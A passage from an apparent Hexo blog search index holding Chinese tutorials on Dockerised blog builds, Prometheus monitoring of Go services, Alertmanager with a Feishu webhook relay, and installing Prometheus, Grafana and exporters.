registry.cn-beijing.aliyuncs.com\n\ndocker run -itd --name levon_blog registry.cn-beijing.aliyuncs.com/levonfly/levon_blog_base:1.0\ndocker exec -it levon_blog /bin/bash  \n```\n\n### 2.2 下载项目1\n\n```bash\ncd ~ && mkdir workspace && cd workspace/\n\n# 1. 下载项目\ngit clone git@github.com:unix2dos/readwrite.git\ncd readwrite\ngit submodule update --init\n\n# 2. 安装依赖\nnpm i\n\n# 3. 测试部署\nhexo server --config source/_data/next.yml\nhexo clean --config source/_data/next.yml && hexo g -d --config source/_data/next.yml\n./deploy.sh\n\n```\n\n### 2.3 下载项目2\n\n```bash\ncd ~ && mkdir workspace && cd workspace/\n\n# 1. 下载项目\ngit clone git@github.com:unix2dos/unix2dos.github.io.git\ncd unix2dos.github.io\ngit checkout source\ngit submodule update --init\n\n# 2. 安装依赖\nnpm i\n\n\n# 3. 插件（不需要） \n\n# 懒加载\ngit clone https://github.com/theme-next/theme-next-jquery-lazyload source/lib/jquery_lazyload\n# 顶部的进度\ngit clone https://github.com/theme-next/theme-next-pace source/lib/pace \n# 读取进度\ngit clone https://github.com/theme-next/theme-next-reading-progress source/lib/reading_progress\n# 分享按钮\ngit clone https://github.com/theme-next/theme-next-needmoreshare2 source/lib/needsharebutton \n# 丝带\ngit clone https://github.com/theme-next/theme-next-canvas-ribbon source/lib/canvas-ribbon\n# 蜘蛛网\ngit clone https://github.com/theme-next/theme-next-canvas-nest source/lib/canvas-nest\n# 三种特效\ngit clone https://github.com/theme-next/theme-next-three source/lib/three \n# 特殊汉字\ngit clone https://github.com/theme-next/theme-next-han source/lib/Han\n# 快速点击\ngit clone https://github.com/theme-next/theme-next-fastclick source/lib/fastclick\n# 图片展示\ngit clone https://github.com/theme-next/theme-next-fancybox3 source/lib/fancybox \n# 文字显示加空格\ngit clone https://github.com/theme-next/theme-next-pangu.git source/lib/pangu\n\n\n# 4. 测试部署\nhexo server --config source/_data/next.yml\nhexo clean --config source/_data/next.yml && hexo g -d --config source/_data/next.yml\n./deploy.sh\n```\n\n\n\n### 2.4 使用\n\n```bash\n# 第一个项目\ndocker run -itd --name blog_unix2dos registry.cn-beijing.aliyuncs.com/levonfly/blog_unix2dos:1.0\n\ndocker exec -it blog_unix2dos /bin/bash  \n\n\n# 第二个项目\ndocker run -itd --name blog_readwrite registry.cn-beijing.aliyuncs.com/levonfly/blog_readwrite:1.0\n\ndocker exec -it blog_readwrite /bin/bash  \n```\n\n\n\n# 4.参考资料\n\n+ https://1c7.me/2019-1-31-china-free-private-docker-registry/","tags":["blog"],"categories":["博客"]},{"title":"prometheus监控golang","url":"%2Fp%2Fbdb3a622.html","content":"\n把prometheus和golang结合在一起，并监控golang的性能和接口状态。\n\n# 1. golang的使用\n\n### 1.1 基础的内置指标\n\n+ 下载包\n\n```bash\ngo get github.com/prometheus/client_golang/prometheus\ngo get github.com/prometheus/client_golang/prometheus/promauto\ngo get github.com/prometheus/client_golang/prometheus/promhttp\n```\n<!-- more -->\n\n\n\n+ 代码注册\n\n```go\npackage main\n\nimport (\n        \"net/http\"\n\n        \"github.com/prometheus/client_golang/prometheus/promhttp\"\n)\n\nfunc main() {\n        http.Handle(\"/metrics\", promhttp.Handler())\n        http.ListenAndServe(\":2112\", nil)\n}\n```\n\n```\ngo run main.go\n```\n\n+ 访问获取信息\n\n```\ncurl http://localhost:2112/metrics\n```\n\n+ 配置prometheus\n\n```bash\nsudo vi /opt/prometheus/prometheus.yml\n```\n\n```yml\n  - job_name: 'golang'\n    scrape_interval: 10s\n    static_configs:\n      - targets: ['127.0.0.1:2112']\n```\n\n```bash\nsudo systemctl restart prometheus\n```\n\n+ 导入模板 6671\n\n<img src=\"prometheus监控golang/image-20220216174037473.png\" alt=\"image-20220216174037473\" style=\"zoom:33%;\" />\n\n\n\n### 1.2 gin 包装 prometheus\n\n+ 下载包\n\n```bash\ngo get github.com/zsais/go-gin-prometheus\n```\n\n+ 代码\n\n```go\n\t// prometheus wrap\n\tp := ginprometheus.NewPrometheus(\"gin\")\n\tp.ReqCntURLLabelMappingFn = func(c *gin.Context) string {\n\t\turl := c.Request.URL.Path\n\t\tfor _, p := range c.Params {\n\t\t\tif p.Key == \"id\" {\n\t\t\t\turl = strings.Replace(url, p.Value, \":id\", 1)\n\t\t\t\tbreak\n\t\t\t} else if p.Key == \"short_link\" {\n\t\t\t\turl = strings.Replace(url, p.Value, \":short_link\", 1)\n\t\t\t\tbreak\n\t\t\t}\n\t\t}\n\t\treturn url\n\t}\n\tp.Use(appEngine)\n```\n\n注意这段代码尽量靠前放，在其他中间件之前。\n\n+ 默认地址是/metrics\n\n​\thttp://127.0.0.1:9061/metrics\n\n![image-20220217103251959](prometheus监控golang/image-20220217103251959.png)\n\n+ 模板\n\n```bash\n# 接口请求\ngin_requests_total{job=\"golang\"}       \nLegend： {{url}}  \n\n\n#错误码\npromhttp_metric_handler_requests_total{job=\"golang\", instance=\"127.0.0.1:9061\"}\nLegend：{{code}} \n```\n\n<img src=\"prometheus监控golang/image-20220217142344934.png\" alt=\"image-20220217142344934\" style=\"zoom:50%;\" />\n\n\n\n### 1.3 另外一个库\n\nhttps://github.com/penglongli/gin-metrics\n\n\n\n# 2. 报警机制\n\n### 2.1 Alert监控报警\n\n+ 打开配置\n\n```bash\nsudo vi /etc/grafana/grafana.ini \n#In your custom configuration file ($WORKING_DIR/conf/custom.ini), go to the unified alerts section. Set the enabled property to true.\n\nsudo systemctl restart grafana-server.service\n```\n\n+ 新建报警API\n\n<img src=\"prometheus%E7%9B%91%E6%8E%A7golang/image-20220217143522329.png\" alt=\"image-20220217143522329\" style=\"zoom: 33%;\" />\n\n飞书不支持，自己用接口中转一下吧。\n<img src=\"prometheus%E7%9B%91%E6%8E%A7golang/image-20220217151105605.png\" alt=\"image-20220217151105605\" style=\"zoom: 33%;\" />\n\n+ 报警匹配规则\n<img src=\"prometheus%E7%9B%91%E6%8E%A7golang/image-20220217151737625.png\" alt=\"image-20220217151737625\" style=\"zoom: 50%;\" />\n\n\n\n\n# 3. 遇到的问题\n\n### 3.1 删除old jobs和instance\n\nExpanding on evgenyl's answer, the exact command would be something like:\n\n```bash\ncurl -X POST -g 'http://localhost:9090/api/v1/admin/tsdb/delete_series?match[]={job=\"name_of_old_job\"}'\n```\n\nReplace name_of_old_job with the name of the job you want deleted.\n\nReminder that you need to have started prometheus with the **--web.enable-admin-api** flag\n\n​\t\n\n```bash\ncurl -X POST -g 'http://localhost:9090/api/v1/admin/tsdb/delete_series?match[]={job=\"linux-node\"}'\ncurl -X POST -g 'http://localhost:9090/api/v1/admin/tsdb/delete_series?match[]={instance=\"localhost:9100\"}'\n```\n\n不过需要注意的是上面的 API 调用并不会立即删除数据，实际数据任然还存在磁盘上，会在后面进行数据清理。\n\n\n\n# 4. 参考资料\n\n+ https://studygolang.com/articles/17959\n+ https://www.cnblogs.com/sanduzxcvbnm/p/13602681.html","tags":["prometheus"],"categories":["3_golang杂项"]},{"title":"Prometheus的alertmanager使用","url":"%2Fp%2F6df22f03.html","content":"\n告警能力在Prometheus的架构中被划分成两个独立的部分通过在Prometheus中定义AlertRule（告警规则），Prometheus会周期性的对告警规则进行计算，如果满足告警触发条件就会向Alertmanager发送告警信息。\n\n![image-20220726115047660](prometheus的alertmanager/0.png)\n\n<!-- more -->\n\n# 1. 数据看板\n\n教程： https://prometheus.io/docs/guides/node-exporter/\n\n### 1.1 查看 metrics\n\n查看target的metrics数据，如果是局域网，可以curl观看。\n\n```bash\ncurl http://172.31.32.228:9100/metrics\n \n\n# HELP go_gc_duration_seconds A summary of the pause duration of garbage collection cycles.\n# TYPE go_gc_duration_seconds summary\ngo_gc_duration_seconds{quantile=\"0\"} 3.6128e-05\ngo_gc_duration_seconds{quantile=\"0.25\"} 7.7366e-05\ngo_gc_duration_seconds{quantile=\"0.5\"} 0.000134775\ngo_gc_duration_seconds{quantile=\"0.75\"} 0.000252918\ngo_gc_duration_seconds{quantile=\"1\"} 0.014089749\ngo_gc_duration_seconds_sum 1298.146436301\ngo_gc_duration_seconds_count 3.161587e+06\n\n# HELP node_filesystem_avail_bytes Filesystem space available to non-root users in bytes.\n# TYPE node_filesystem_avail_bytes gauge\nnode_filesystem_avail_bytes{device=\"/dev/root\",fstype=\"ext4\",mountpoint=\"/\"} 3.1182485504e+11\nnode_filesystem_avail_bytes{device=\"tmpfs\",fstype=\"tmpfs\",mountpoint=\"/run\"} 1.657331712e+09\nnode_filesystem_avail_bytes{device=\"tmpfs\",fstype=\"tmpfs\",mountpoint=\"/run/lock\"} 5.24288e+06\nnode_filesystem_avail_bytes{device=\"tmpfs\",fstype=\"tmpfs\",mountpoint=\"/run/snapd/ns\"} 1.657331712e+09\n# HELP node_filesystem_device_error Whether an error occurred while getting statistics for the given device.\n```\n\n\n\n### 1.2 登录prometheus面板查询\n\nClick on the links below to see some example metrics:\n\n| Metric                                                       | Meaning                                                      |\n| :----------------------------------------------------------- | :----------------------------------------------------------- |\n| rate(node_cpu_seconds_total{mode=\"system\"}[1m])              | The average amount of CPU time spent in system mode, per second, over the last minute (in seconds) |\n| [`node_filesystem_avail_bytes`](http://localhost:9090/graph?g0.range_input=1h&g0.expr=node_filesystem_avail_bytes&g0.tab=1) | The filesystem space available to non-root users (in bytes)  |\n| [`rate(node_network_receive_bytes_total[1m\\])`](http://localhost:9090/graph?g0.range_input=1h&g0.expr=rate(node_network_receive_bytes_total[1m])&g0.tab=1) | The average network traffic received, per second, over       |\n\n![image-20220726115047660](prometheus的alertmanager/1.jpg)\n\n\n\n### 1.3 常用查询\n\n+ 硬盘百分比\n\n```bash\n(node_filesystem_size_bytes{fstype=~\"ext.?|xfs\"}-node_filesystem_free_bytes{fstype=~\"ext.?|xfs\"}) *100/(node_filesystem_avail_bytes {fstype=~\"ext.?|xfs\"}+(node_filesystem_size_bytes{fstype=~\"ext.?|xfs\"}-node_filesystem_free_bytes{fstype=~\"ext.?|xfs\"}))\n\n\n\n{device=\"/dev/root\", fstype=\"ext4\", instance=\"172.31.23.50:9100\", job=\"nodes\", mountpoint=\"/\"}\n78.75283914928764\n{device=\"/dev/root\", fstype=\"ext4\", instance=\"172.31.31.250:9100\", job=\"nodes\", mountpoint=\"/\"}\n67.58544213895829\n{device=\"/dev/root\", fstype=\"ext4\", instance=\"172.31.32.228:9100\", job=\"nodes\", mountpoint=\"/\"}\n83.37226643085346\n{device=\"/dev/root\", fstype=\"ext4\", instance=\"172.31.34.98:9100\", job=\"nodes\", mountpoint=\"/\"}\n59.98458796757968\n{device=\"/dev/root\", fstype=\"ext4\", instance=\"172.31.4.34:9100\", job=\"nodes\", mountpoint=\"/\"}\n44.50606176808944\n{device=\"/dev/root\", fstype=\"ext4\", instance=\"172.31.5.167:9100\", job=\"nodes\", mountpoint=\"/\"}\n55.990707884250575\n{device=\"/dev/root\", fstype=\"ext4\", instance=\"172.31.62.61:9100\", job=\"nodes\", mountpoint=\"/\"}\n59.72077496207543\n\n\n\nmax((node_filesystem_size_bytes{fstype=~\"ext.?|xfs\"}-node_filesystem_free_bytes{fstype=~\"ext.?|xfs\"}) *100/(node_filesystem_avail_bytes {fstype=~\"ext.?|xfs\"}+(node_filesystem_size_bytes{fstype=~\"ext.?|xfs\"}-node_filesystem_free_bytes{fstype=~\"ext.?|xfs\"})))by(instance)\n\n\n\n{instance=\"172.31.23.50:9100\"}\n78.7537961493076\n{instance=\"172.31.31.250:9100\"}\n67.58565865534388\n{instance=\"172.31.32.228:9100\"}\n83.37490113461213\n{instance=\"172.31.34.98:9100\"}\n59.98515901697431\n{instance=\"172.31.4.34:9100\"}\n44.50609327426293\n{instance=\"172.31.5.167:9100\"}\n55.99347648924661\n{instance=\"172.31.62.61:9100\"}\n59.721523233695976\n```\n\n\n\n# 2. Alertmanager\n\nAlertmanager和Prometheus Server一样均采用Golang实现，并且没有第三方依赖。\n\n### 2.1 下载安装\n\nhttps://prometheus.io/download/#alertmanager\n\n```bash\nsudo wget https://github.com/prometheus/alertmanager/releases/download/v0.24.0/alertmanager-0.24.0.linux-amd64.tar.gz\n\nsudo tar zxvf alertmanager-0.24.0.linux-amd64.tar.gz\nsudo mv alertmanager-0.24.0.linux-amd64/ /opt/alertmanager\n```\n\n\n\nAlertmanager解压后会包含一个默认的alertmanager.yml配置文件，Alertmanager的配置主要包含两个部分：路由(route)以及接收器(receivers)。\n\n所有的告警信息都会从配置中的顶级路由(route)进入路由树，根据路由规则将告警信息发送给相应的接收器。Alermanager会将数据保存到本地中，默认的存储路径为`data/`。\n\n### 2.2 服务并启动\n\n```\nsudo vi /usr/lib/systemd/system/alertmanager.service\n```\n\n```bash\n[Unit]\nDescription=alertmanager service\n \n[Service]\nUser=root\nWorkingDirectory=/opt/alertmanager\nExecStart=/opt/alertmanager/alertmanager\nTimeoutStopSec=10\nRestart=on-failure\nRestartSec=5\n \n[Install]\nWantedBy=multi-user.target\n```\n\n```bash\nsudo systemctl daemon-reload\nsudo systemctl enable alertmanager\nsudo systemctl restart alertmanager\n\nsudo systemctl status alertmanager\nsudo lsof -i:9093\n```\n\n+ 访问\n\nAlertmanager启动后可以通过9093端口访问。\n\n```\ncurl http://127.0.0.1:9093\n```\n\n\n\n### 2.3 关联Prometheus\n\n编辑Prometheus配置文件prometheus.yml,并添加以下内容\n\n```bash\nalerting:\n  alertmanagers:\n    - static_configs:\n        - targets: ['localhost:9093']\n```\n\n重启Prometheus服务，成功后，可以从http://192.168.40.98:9090/config 查看alerting配置是否生效。\n\n\n\n### 2.3 Prometheus告警规则\n\n一条告警规则主要由以下几部分组成：\n\n- alert：告警规则的名称。\n\n- expr：基于PromQL表达式告警触发条件，用于计算是否有时间序列满足该条件。\n\n- for：评估等待时间，可选参数。用于表示只有当触发条件持续一段时间后才发送告警。在等待期间新产生告警的状态为pending。\n\n- labels：自定义标签，允许用户指定要附加到告警上的一组附加标签。\n\n- annotations：用于指定一组附加信息，比如用于描述告警详细信息的文字等，annotations的内容在告警产生时会一同作为参数发送到Alertmanager。\n\n  \n\n为了能够让Prometheus能够启用定义的告警规则，我们需要在Prometheus全局配置文件中通过**rule_files**指定一组告警规则文件的访问路径。\n\n```yml\nrule_files:\n  - /opt/prometheus/rules/*.rules\n```\n\n+ 创建告警\n\n  sudo vi node-export-alert.rules\n\n  ```bash\n  groups:\n  - name: NodeExportAlert\n    rules:\n    - alert: DiskUsageAlert\n      expr: max((node_filesystem_size_bytes{fstype=~\"ext.?|xfs\"}-node_filesystem_free_bytes{fstype=~\"ext.?|xfs\"}) *100/(node_filesystem_avail_bytes {fstype=~\"ext.?|xfs\"}+(node_filesystem_size_bytes{fstype=~\"ext.?|xfs\"}-node_filesystem_free_bytes{fstype=~\"ext.?|xfs\"})))by(instance) > 70\n      for: 1m\n      labels:\n        severity: page\n      annotations:\n        summary: \"Instance {{ $labels.instance }} disk usgae high\"\n        description: \"Disk usage high, above 70% (current value: {{ $value }})\"\n        \n    - alert: CpuAlert\n      expr: (1 - avg(rate(node_cpu_seconds_total{mode=\"idle\"}[1m])) by (instance)) * 100 > 70\n      for: 1m\n      labels:\n        severity: page\n      annotations:\n        summary: \"Instance {{ $labels.instance }} disk usgae high\"\n        description: \"CPU usage high, above 70% (current value: {{ $value }})\"\n        \n    - alert: MemoryUsageAlert\n      expr: (1 - (node_memory_MemAvailable_bytes{} / (node_memory_MemTotal_bytes{})))* 100 > 70\n      for: 1m\n      labels:\n        severity: page\n      annotations:\n        summary: \"Instance {{ $labels.instance }} disk usgae high\"\n        description: \"Memory usage high, above 70% (current value: {{ $value }})\"      \n        \n        \n    - alert: DiskIOAlert\n      expr: rate(node_disk_io_time_seconds_total{job='nodes'}[1m]) * 100 > 50\n      for: 1m\n      labels:\n        severity: page\n      annotations:\n        summary: \"Instance {{ $labels.instance }} disk io high\"\n        description: \"Disk io high, current value: {{ $value }})\"    \n        \n        \n    \n    - alert: DiskWriteAlert\n      expr: rate(node_disk_written_bytes_total{job='nodes'}[1m])/8/1024/1024 > 10\n      for: 1m\n      labels:\n        severity: page\n      annotations:\n        summary: \"Instance {{ $labels.instance }} Disk write high\"\n        description: \"Disk write high, current value: {{ $value }}) M/s\"    \n  \n  \n    - alert: FileFdAlert\n        expr: (node_filefd_allocated{job='nodes'}/node_filefd_maximum{job='nodes'}) *100 > 50\n        for: 1m\n        labels:\n          severity: page\n        annotations:\n          summary: \"Instance {{ $labels.instance }} file fd high\"\n          description: \"File fd high, current value: {{ $value }})\"    \n  \n  ```\n  \n  \n  \n  ```bash\n   sudo systemctl restart prometheus\n  ```\n  \n  \n  \n  重启Prometheus后访问Prometheus UI http://127.0.0.1:9090/rules可以查看当前以加载的规则文件。\n\n​\t\t![image-20220726151420749](prometheus的alertmanager/2.jpg)\n\n查看Alertmanager UI此时可以看到Alertmanager接收到的告警信息。\n\n![image-20220726151737330](prometheus的alertmanager/3.jpg)\n\n\n\n# 3. Alertmanager配置\n\nAlertmanager主要负责对Prometheus产生的告警进行统一处理，因此在Alertmanager配置中一般会包含以下几个主要部分：\n\n- 全局配置（global）：用于定义一些全局的公共参数，如全局的SMTP配置，Slack配置等内容；\n- 模板（templates）：用于定义告警通知时的模板，如HTML模板，邮件模板等；\n- 告警路由（route）：根据标签匹配，确定当前告警应该如何处理；\n- 接收人（receivers）：接收人是一个抽象的概念，它可以是一个邮箱也可以是微信，Slack或者Webhook等，接收人一般配合告警路由使用；\n- 抑制规则（inhibit_rules）：合理设置抑制规则可以减少垃圾告警的产生。\n\n在全局配置中需要注意的是`resolve_timeout`，该参数定义了当Alertmanager持续多长时间未接收到告警后标记告警状态为resolved（已解决）。该参数的定义可能会影响到告警恢复通知的接收时间，读者可根据自己的实际场景进行定义，其默认值为5分钟。\n\n\n\n### 3.1 webhook配置\n\n```bash\ncd /opt/alertmanager\nvi alertmanager.yml\n```\n\n+ 配置\n\n```yml\nroute:\n  group_by: ['alertname']\n  group_wait: 30s\n  group_interval: 5m\n  repeat_interval: 1h\n  receiver: 'web.hook'\nreceivers:\n  - name: 'web.hook'\n    webhook_configs:\n      - url: 'http://127.0.0.1:5001/'\ninhibit_rules:\n  - source_match:\n      severity: 'critical'\n    target_match:\n      severity: 'warning'\n    equal: ['alertname', 'dev', 'instance']\n```\n\n+ 重启\n\n```bash\nsudo systemctl restart prometheus\nsudo systemctl restart alertmanager\n```\n\n  \n\n### 3.2 webhook代码\n\n```go\npackage main\n\nimport (\n\t\"bytes\"\n\t\"encoding/json\"\n\t\"fmt\"\n\t\"io/ioutil\"\n\t\"log\"\n\t\"net/http\"\n\t\"strings\"\n\n\t\"github.com/gin-gonic/gin\"\n)\n\nvar (\n\tHookUrl = \"https://open.feishu.cn/open-apis/bot/v2/hook/xxxxxxxxxxx\" // test\n)\n\nfunc main() {\n\trouter := gin.Default()\n\trouter.POST(\"/webhook\", func(c *gin.Context) {\n\t\tdata, _ := ioutil.ReadAll(c.Request.Body)\n\t\terr := Hook(string(data))\n\t\tif err != nil {\n\t\t\tc.JSON(http.StatusBadRequest, gin.H{\"error\": err.Error()})\n\t\t\treturn\n\t\t}\n\t\tc.JSON(http.StatusOK, gin.H{\"message\": \" successful receive alert notification message!\"})\n\t})\n\trouter.Run(\":8002\")\n}\n\nfunc Hook(data string) (err error) {\n\tlog.Println(\"Hook start, data:\", data)\n\n\tvar notification Notification\n\terr = json.Unmarshal([]byte(data), &notification)\n\tif err != nil {\n\t\tlog.Println(\"Hook Unmarshal err:\", err)\n\t\treturn\n\t}\n\n\tfor _, v := range notification.Alerts {\n\t\talert, _ := v.Labels[\"alertname\"]\n\t\tinstance, _ := v.Labels[\"instance\"]\n\t\tdes, _ := v.Annotations[\"description\"]\n\t\ttext := TempStr(alert, instance, des)\n\t\t_ = FeishuAlarmText(text)\n\t}\n\n\treturn\n}\n\nfunc TempStr(alert, instance, des string) string {\n\ttemp := `{\"config\":{\"wide_screen_mode\":true},\"elements\":[{\"fields\":[{\"is_short\":true,\"text\":{\"content\":\"{{__alert__}}\",\"tag\":\"lark_md\"}},{\"is_short\":true,\"text\":{\"content\":\"{{__instance__}}\",\"tag\":\"lark_md\"}}],\"tag\":\"div\"},{\"tag\":\"div\",\"text\":{\"content\":\"{{__text__}}\",\"tag\":\"lark_md\"}},{\"tag\":\"hr\"},{\"elements\":[{\"content\":\"[来自 Prometheus](http://prometheus.staff.funlink-tech.com/)\",\"tag\":\"lark_md\"}],\"tag\":\"note\"}],\"header\":{\"template\":\"red\",\"title\":{\"content\":\"【Alert 报警】  {{__header__}}\",\"tag\":\"plain_text\"}}}`\n\tstr := temp\n\tstr = strings.ReplaceAll(str, \"{{__header__}}\", instance)\n\tstr = strings.ReplaceAll(str, \"{{__alert__}}\", fmt.Sprintf(\"**类型:**  %s\", alert))\n\tstr = strings.ReplaceAll(str, \"{{__instance__}}\", fmt.Sprintf(\"**主机:**  [%s](http://grafana.staff.funlink-tech.com/d/9CWBz0bik/fu-wu-qi-xin-xi?orgId=1)\", instance))\n\tstr = strings.ReplaceAll(str, \"{{__text__}}\", fmt.Sprintf(\"**描述:**  %s\", des))\n\treturn fmt.Sprintf(\"{\\\"msg_type\\\":\\\"interactive\\\",\\\"card\\\":%v}\", str)\n}\n\nfunc FeishuAlarmText(text string) (err error) {\n\t_, err = http.Post(HookUrl, \"application/json\", bytes.NewBufferString(text))\n\tif err != nil {\n\t\tlog.Println(\"http err:\", err)\n\t\treturn\n\t}\n\treturn\n}\n```\n\n\n\n### 3.3 启动服务\n\n`sudo vi /usr/lib/systemd/system/alerthook.service`\n\n```bash\n[Unit]\nDescription=alerthook service\n \n[Service]\nUser=root\nWorkingDirectory=/data/opt/alert-hook\nExecStart=/data/opt/alert-hook/alert-hook\nTimeoutStopSec=10\nRestart=on-failure\nRestartSec=5\n \n[Install]\nWantedBy=multi-user.target\n```\n+ 操作\n\n```bash\nsudo systemctl daemon-reload\nsudo systemctl enable alerthook\nsudo systemctl restart alerthook\nsudo systemctl status alerthook\n\nsudo journalctl -u alerthook -f\n```\n\n\n\n# 4. 参考资料\n\n+ https://yunlzheng.gitbook.io/prometheus-book/parti-prometheus-ji-chu/alert/install-alert-manager","tags":["prometheus"],"categories":["软件"]},{"title":"prometheus和grafana的安装和使用","url":"%2Fp%2Fbfd67891.html","content":"\n传说地球上本没有火种，那时人类的生活非常困苦。普罗米修斯为了给人类造福，就冒着生命危险，从太阳神阿波罗那里去偷走了一个火种，给人类带来了光明，是一位让人敬仰的神。他因此而受到宙斯的处罚，被绑在高加索山，每日忍受风吹日晒和鹫鹰啄食，后被赫拉克勒斯救出。\n\n<!-- more -->\n\n# 1. prometheus\n\n### 1.1 安装\n\nhttps://prometheus.io/download/\n\n```bash\nwget https://github.com/prometheus/prometheus/releases/download/v2.33.3/prometheus-2.33.3.linux-amd64.tar.gz\nsudo tar zxvf prometheus-2.33.3.linux-amd64.tar.gz -C /opt\nsudo mv /opt/prometheus-2.33.3.linux-amd64 /opt/prometheus\n```\n\n\n\n### 1.2 启动\n\n```\nsudo vi /usr/lib/systemd/system/prometheus.service\n```\n\n```bash\n[Unit]\nDescription=prometheus service\n \n[Service]\nUser=root\nExecStart=/opt/prometheus/prometheus --config.file=/opt/prometheus/prometheus.yml --storage.tsdb.path=/opt/prometheus/data --web.enable-admin-api\n \nTimeoutStopSec=10\nRestart=on-failure\nRestartSec=5\n \n[Install]\nWantedBy=multi-user.target\n```\n\n启动\n\n```bash\nsudo systemctl daemon-reload\nsudo systemctl enable prometheus\nsudo systemctl restart prometheus\nsudo systemctl status prometheus\n```\n\n\n\n浏览器打开IP:9090端口即可打开 prometheus 自带的监控页面。\n\nhttp://192.168.40.98:9090/\n\n\n\n# 2. Grafana\n\n### 2.1 安装\n\n```bash\nsudo apt-get install -y apt-transport-https\nsudo apt-get install -y software-properties-common wget\nwget -q -O - https://packages.grafana.com/gpg.key | sudo apt-key add -\necho \"deb https://packages.grafana.com/oss/deb stable main\" | sudo tee -a /etc/apt/sources.list.d/grafana.list\nsudo apt-get update\nsudo apt-get install grafana\n```\n\n\n\n### 2.2 启动\n\n```bash\nsudo systemctl daemon-reload\nsudo systemctl enable grafana-server\nsudo systemctl start grafana-server\n```\n\n\n\n### 2.3 配置\n\n浏览器访问IP:3000端口，即可打开grafana页面，默认用户名密码都是admin，初次登录会要求修改默认的登录密码：\n\nhttp://192.168.40.98:3000\n\n点击主界面的“Add your first data source”并选择Prometheus（这一步不能省）：\n\n<img src=\"prometheus%E5%92%8CGrafana%E7%9A%84%E5%AE%89%E8%A3%85%E5%92%8C%E4%BD%BF%E7%94%A8/image-20220215173311851.jpg\" alt=\"image-20220215173311851\" style=\"zoom:50%;\" />\n\n\n\nDashboards页面选择“Prometheus 2.0 Stats”进行Import：\n\n<img src=\"prometheus%E5%92%8CGrafana%E7%9A%84%E5%AE%89%E8%A3%85%E5%92%8C%E4%BD%BF%E7%94%A8/image-20220215173409910.jpg\" alt=\"image-20220215173409910\" style=\"zoom:50%;\" />\n\nSettings页面填写普罗米修斯地址并保存：\n\nhttp://192.168.40.98:9090/\n\n<img src=\"prometheus%E5%92%8CGrafana%E7%9A%84%E5%AE%89%E8%A3%85%E5%92%8C%E4%BD%BF%E7%94%A8/image-20220215174934193.jpg\" alt=\"image-20220215174934193\" style=\"zoom:50%;\" />\n\n​\t切换到我们刚才添加的“Prometheus 2.0 Stats”即可看到整个监控页面(点击下面蓝色部分)：\n\n<img src=\"prometheus%E5%92%8CGrafana%E7%9A%84%E5%AE%89%E8%A3%85%E5%92%8C%E4%BD%BF%E7%94%A8/image-20220215175144919.jpg\" alt=\"image-20220215175144919\" style=\"zoom:50%;\" />\n\n# 3. 监控示例\n\n### 3.1 CPU, 内存，磁盘（node_exporter）\n\n为了能够采集到主机的运行指标如CPU, 内存，磁盘等信息。我们可以使用 Node Exporter。Node Exporter同样采用Golang编写，并且不存在任何的第三方依赖，只需要下载，解压即可运行。可以从 https://prometheus.io/download/#node_exporter 获取最新的node exporter版本的二进制包。\n\n```bash\nwget https://github.com/prometheus/node_exporter/releases/download/v1.3.1/node_exporter-1.3.1.linux-amd64.tar.gz\nsudo tar zxf node_exporter-1.3.1.linux-amd64.tar.gz -C /opt\nsudo mv /opt/node_exporter-1.3.1.linux-amd64 /opt/node_exporter\n```\n\n+ 配置\n\n增加service\n\n```\nsudo vi /usr/lib/systemd/system/node_exporter.service\n```\n\n```bash\n[Unit]\nDescription=node_exporter service\n \n[Service]\nUser=root\nExecStart=/opt/node_exporter/node_exporter\n \nTimeoutStopSec=10\nRestart=on-failure\nRestartSec=5\n \n[Install]\nWantedBy=multi-user.target\n```\n\n+ 启动\n\n```bash\nsudo systemctl daemon-reload\nsudo systemctl enable node_exporter\nsudo systemctl start node_exporter\nsudo systemctl status node_exporter\n```\n\n- Prometheus配置文件添加监控项\n\n`sudo vi /opt/prometheus/prometheus.yml`\n\n```bash\n  - job_name: 'linux-node'\n    static_configs:\n    - targets: ['localhost:9100']\n      labels:\n        instance: linux-node1\n```\n\n9100是`node_exporter`的端口。\n\n+ 重启\n\n`sudo systemctl restart prometheus`\n\n此时可以去prometheus看下target是否有了。\n\n<img src=\"prometheus%E5%92%8CGrafana%E7%9A%84%E5%AE%89%E8%A3%85%E5%92%8C%E4%BD%BF%E7%94%A8/image-20220216100808899.jpg\" alt=\"image-20220216100808899\" style=\"zoom: 33%;\" />\n\n+ 导入grafana模板，数据展示\n\n<img src=\"prometheus%E5%92%8CGrafana%E7%9A%84%E5%AE%89%E8%A3%85%E5%92%8C%E4%BD%BF%E7%94%A8/image-20220215183334543.jpg\" alt=\"image-20220215183334543\" style=\"zoom:50%;\" />\n\n​\t\t模板编号请去，grafana的官网 https://grafana.com/dashboards去查找， 我用的编号 8919\n\n​\t\t<img src=\"prometheus%E5%92%8CGrafana%E7%9A%84%E5%AE%89%E8%A3%85%E5%92%8C%E4%BD%BF%E7%94%A8/image-20220215183626806.jpg\" alt=\"image-20220215183626806\" style=\"zoom: 50%;\" />\n\n​\t选择我们前文创建好的数据源，点击导入即可。\n\n<img src=\"prometheus%E5%92%8CGrafana%E7%9A%84%E5%AE%89%E8%A3%85%E5%92%8C%E4%BD%BF%E7%94%A8/image-20220215185843612.jpg\" alt=\"image-20220215185843612\" style=\"zoom:33%;\" />\n\n### 3.1 MySQL(mysqld_exporter)\n\n+ 在被监控服务器创建监控用户\n\n```mysql\nCREATE USER 'mysqld_exporter'@'127.0.0.1' IDENTIFIED BY 'mysqld_exporter';\n\nGRANT REPLICATION SLAVE, REPLICATION CLIENT ON *.* TO 'mysqld_exporter'@'127.0.0.1';\n\nGRANT SELECT ON performance_schema.* TO 'mysqld_exporter'@'127.0.0.1';\n\nflush privileges;\n```\n\n+ 下载安装\n\nhttps://prometheus.io/download/#mysqld_exporter\n\n```bash\nwget https://github.com/prometheus/mysqld_exporter/releases/download/v0.13.0/mysqld_exporter-0.13.0.linux-amd64.tar.gz\nsudo tar zxf mysqld_exporter-0.13.0.linux-amd64.tar.gz -C /opt\nsudo mv /opt/mysqld_exporter-0.13.0.linux-amd64 /opt/mysqld_exporter\n```\n\n- 设置配置文件，user为数据库登录用户，password为这个用户的密码：\n\n```\ncd /opt/mysqld_exporter\nsudo vi .my.cnf\n```\n\n```mysql\n[client]\nhost=127.0.0.1\nport=3306\nuser=mysqld_exporter\npassword=mysqld_exporter\n```\n\n+ 配置开机自启动并启动服务\n\n```\nsudo vi /usr/lib/systemd/system/mysqld_exporter.service\n```\n\n```yml\n[Unit]\nDescription=mysqld_exporter service\n \n[Service]\nUser=root\nExecStart=/opt/mysqld_exporter/mysqld_exporter --config.my-cnf=/opt/mysqld_exporter/.my.cnf\n 